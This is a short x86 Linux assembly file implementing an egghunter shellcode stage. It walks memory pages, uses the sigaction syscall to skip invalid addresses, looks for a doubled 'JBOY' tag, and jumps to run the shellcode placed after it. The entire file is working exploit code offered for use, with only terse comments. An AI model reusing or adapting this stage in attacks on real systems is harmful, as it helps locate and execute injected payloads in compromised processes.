global _start
section .text

_start:
	xor	ecx, ecx			    ;zero out ecx

page_allign:				
	xor	cx, 0x0fff			  ;Page allignment

valid_add:		
	inc	ecx					      ;increment the pointer to try next valid address
	push 0x43			      	;push syscall 67 | sigaction
	pop	eax					      ;EAX=0x43
	int	0x80				      ;call sigaction() for validation

efault_cmpsn:
	cmp	al, 0xf2			    ;Low-byte of EAX compared against 0xf2|EFAULT
	jz	page_allign			  ;If ZF set JMP back to "page_allign"

search_tag:
	mov	eax, 0x4a424f59		;move the "tag" to EAX register| 0x4a424f59 = JBOY
	mov	edi, ecx			    ;move ECX to EDI
	scasd					        ;Compare contents of EDI to the dword value in EAX and increment
	jnz	valid_add			    ;Not equal? then go back to valid_add
	scasd					        ;Compare contents of EDI to the dword value in EAX and increment
	jnz	valid_add			    ;Not equal? then go back to valid_add
	jmp	edi					      ;TAG found ==> Execute the shellcode I'm pointing to
